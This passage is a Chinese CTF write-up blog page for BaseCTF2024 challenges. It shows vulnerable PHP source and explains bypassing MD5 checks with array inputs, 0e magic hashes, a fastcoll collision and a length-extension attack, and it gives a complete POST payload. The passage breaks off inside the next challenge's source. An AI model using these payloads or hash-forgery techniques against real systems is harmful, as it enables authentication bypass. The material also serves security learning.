@@ -1,0 +1,889 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="## 所以你说你懂 MD5?  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpsession_start();highlight_file(__FILE__);&#x2F;&#x2F; 所以你说你懂 MD5 了?$apple &#x3D; $_PO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BaseCTF2024新生赛（复现部分">
+<meta property="og:url" content="https://xendr1a.github.io/2025/09/02/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0%E9%83%A8%E5%88%86/index.html">
+<meta property="og:site_name" content="Xendr1a">
+<meta property="og:description" content="## 所以你说你懂 MD5?  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpsession_start();highlight_file(__FILE__);&#x2F;&#x2F; 所以你说你懂 MD5 了?$apple &#x3D; $_PO">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-02T13:31:07.000Z">
+<meta property="article:modified_time" content="2025-09-02T13:31:07.000Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="比赛">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>BaseCTF2024新生赛（复现部分 - Xendr1a</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BaseCTF2024新生赛（复现部分"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-02 21:31" pubdate>
+          2025年9月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          77 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BaseCTF2024新生赛（复现部分</h1>
+            
+            
+              <div class="markdown-body">
+                
+                
+## 所以你说你懂 MD5?
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 所以你说你懂 MD5 了?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;加强难度就不会了?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 什么? 你绕过去了?</span><br><span class="hljs-comment">// 加大剂量!</span><br><span class="hljs-comment">// 我要让他成为 string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;难吗?不难!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你还是绕过去了?</span><br><span class="hljs-comment">// 哦哦哦, 我少了一个等于号</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你以为这就结束了</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// 你想看到 random 的值吗?</span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5</span><br><span class="hljs-comment">// 那 flag 就给你吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>); <span class="hljs-number">6</span>f0f100676701a2978accb15ec22f218<br>不是管理员也来凑热闹?<br></code></pre></td></tr></table></figure>
+
+第一层的强比较可以用数组绕过apple[]=1&banana[]=2然后第二层的弱比较可以用两个经过md5后开头为0e的来绕过第三层的强比较我们可以使用 fastcoll 工具，碰撞出一个值来绕过第四层运用到了md5的长度扩展攻击，这玩意感觉挺复杂的，但是网上能找到工具[https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py](https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py)就是说通过一个已知哈希值 Hash 和消息长度 len(Msg) 的哈希值时，我们能利用其复现出大致的加密过程，然后我们利用这个的过程重新生成一个附加了新数据的md5值哈希值在我们绕过第三层的时候会给我们，消息长度和我们需要的附加值的话我们看到这里
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<span class="hljs-comment">//这里就能看出长度了16字节*3=48个字节，48个字节 * 2 十六进制字符/字节 = 96个字符</span><br><br><span class="hljs-comment">// 你想看到 random 的值吗?</span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5</span><br><span class="hljs-comment">// 那 flag 就给你吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+就是96个字符，然后添加个admin
+
+![](http://xendria.icu/wp-content/uploads/2025/06/cc922cac-6c45-41b5-8f41-9ae04d09fd19-1024x188.png)
+
+![](http://xendria.icu/wp-content/uploads/2025/06/c575db54-19c6-498c-8cd7-184887bc8c33-1024x511.png)
+
+记得把cookie改为绕过第三层时的PHPSESSID（栽这半天了
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">payload：<br>apple[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;banana[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;appple<span class="hljs-operator">=</span>byGcY&amp;bananana<span class="hljs-operator">=</span>QNKCDZO&amp;apppple<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;banananana<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;name<span class="hljs-operator">=</span><span class="hljs-variable">%80</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span>admin&amp;md<span class="hljs-number">5</span><span class="hljs-operator">=</span>生成的值<br></code></pre></td></tr></table></figure>
+
+## 玩原神玩的
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;len&#x27;</span>]) == <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>)) &#123;<br>  <span class="hljs-title function_ invoke__">ys_open</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tip&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ys_open</span>(<span class="hljs-params"><span 